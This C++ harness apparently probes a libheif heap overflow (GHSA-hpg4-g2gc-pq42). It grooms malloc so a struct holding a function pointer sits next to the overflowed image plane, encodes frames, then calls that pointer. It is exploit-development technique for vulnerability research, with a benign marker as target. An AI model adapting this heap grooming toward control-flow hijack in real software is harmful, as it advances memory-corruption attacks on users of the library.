// Bounded heap-adjacency probe for GHSA-hpg4-g2gc-pq42 on the real pinned
// v1.23.6 decoder-to-x265-encoder path.
//
// Question: can a pointer-bearing LIVE object occupy the malloc chunk directly
// after the 32783-byte replacement plane, so that the one-row overflow reaches
// a pointer rather than free/top metadata?
//
// Method (harness grooming, NOT file-derived placement): before frame 1 is
// decoded, allocate chunk A of the exact plane size and a live Victim B right
// after it (both from the top chunk, so contiguous), then free A. If libheif's
// calloc(32783) reuses A, B is the plane's neighbour. Victim holds a function
// pointer at offset 0 and a tag; the overflow row is expected to overwrite the
// chunk size at B-8 and the pointer at B+0.
//
// This is a rung-4 mechanics probe only. It does not claim file-derived
// placement, a valid target address, a marker or rung 5.
#include <cstdio>
#include <cstdlib>
#include <cstdint>
#include <libheif/heif.h>
#include <libheif/heif_sequences.h>

// Same-size victim: both A and B are 32783-byte chunks so neither is served
// from a small fastbin/tcache; when both come from the top chunk in order,
// A < B and B is A's immediate neighbour.
struct Victim {
  void (*fn)();
  unsigned char tag[32775];
};

static void report(const char* what, heif_error err)
{
  if (err.code) {
    std::fprintf(stderr, "%s: rc=%d sub=%d %s\n", what, err.code, err.subcode,
                 err.message ? err.message : "(no message)");
  }
}

static void benign_marker() { std::printf("BENIGN_MARKER_CALLED\n"); }

// Globals so a gdb breakpoint command can inspect the groomed chunks even
// before main's locals are in scope.
void* g_A = nullptr;
Victim* g_B = nullptr;
int main(int argc, char** argv)
{
  if (argc < 3) {
    std::fprintf(stderr, "usage: %s INPUT.heif OUTPUT.heif\n", argv[0]);
    return 64;
  }

  heif_context* in = heif_context_alloc();
  report("read", heif_context_read_from_file(in, argv[1], nullptr));
  if (!heif_context_has_sequence(in)) return 1;
  heif_track* in_track = heif_context_get_track(in, 0);
  uint16_t tw = 0, th = 0;
  report("track resolution", heif_track_get_image_resolution(in_track, &tw, &th));
  std::printf("track declared: %ux%u\n", tw, th);

  heif_context* out = heif_context_alloc();
  heif_track* out_track = nullptr;
  heif_encoder* encoder = nullptr;
  report("get x265 encoder", heif_context_get_encoder_for_format(out, heif_compression_HEVC, &encoder));
  if (!encoder) return 2;
  report("add track", heif_context_add_visual_sequence_track(out, tw, th,
                                                             heif_track_type_image_sequence,
                                                             nullptr, nullptr, &out_track));
  if (!out_track) return 3;

  void* A = nullptr;
  Victim* B = nullptr;
  for (int frame = 0;; ++frame) {
    if (frame == 1) {
      // Groom: A then B, both exact plane size; free A so calloc reclaims it.
      A = std::malloc(32783);
      B = static_cast<Victim*>(std::malloc(sizeof(Victim)));
      B->fn = benign_marker;
      for (int i = 0; i < 32775; ++i) B->tag[i] = static_cast<unsigned char>(0xa5 + (i & 0xff));
      std::free(A);
      g_A = A;
      g_B = B;
      std::printf("GROOM A=%p B=%p A<B=%d fn=%p tag0=0x%02x\n",
                  A, static_cast<void*>(B),
                  static_cast<char*>(A) < static_cast<char*>(static_cast<void*>(B)),
                  reinterpret_cast<void*>(B->fn), B->tag[0]);
    }
    heif_image* img = nullptr;
    heif_error err = heif_track_decode_next_image(in_track, &img,
                                                  heif_colorspace_YCbCr,
                                                  heif_chroma_420, nullptr);
    if (err.code == heif_error_End_of_sequence) break;
    if (err.code) { report("decode", err); return 4; }
    int stride = 0;
    heif_image_get_plane_readonly(img, heif_channel_Y, &stride);
    std::printf("frame %d decoded: %dx%d stride=%d\n", frame,
                heif_image_get_width(img, heif_channel_Y),
                heif_image_get_height(img, heif_channel_Y), stride);
    std::fflush(stdout);
    const heif_error enc_err = heif_track_encode_sequence_image(out_track, img, encoder, nullptr);
    report("encode", enc_err);
    std::printf("frame %d encoded rc=%d\n", frame, enc_err.code);
    std::fflush(stdout);
    if (frame == 1 && B) {
      std::printf("POST B fn=%p tag[0..7]=", reinterpret_cast<void*>(B->fn));
      for (int i = 0; i < 8; ++i) std::printf("%02x ", B->tag[i]);
      std::printf("\n");
      std::fflush(stdout);
    }
    heif_image_release(img);
  }
  if (B) {
    std::printf("CALL B fn=%p\n", reinterpret_cast<void*>(B->fn));
    std::fflush(stdout);
    B->fn();
  }
  report("end sequence", heif_track_encode_end_of_sequence(out_track, encoder));
  report("write", heif_context_write_to_file(out, argv[2]));
  heif_encoder_release(encoder);
  heif_track_release(out_track);
  heif_context_free(out);
  heif_track_release(in_track);
  heif_context_free(in);
  return 0;
}
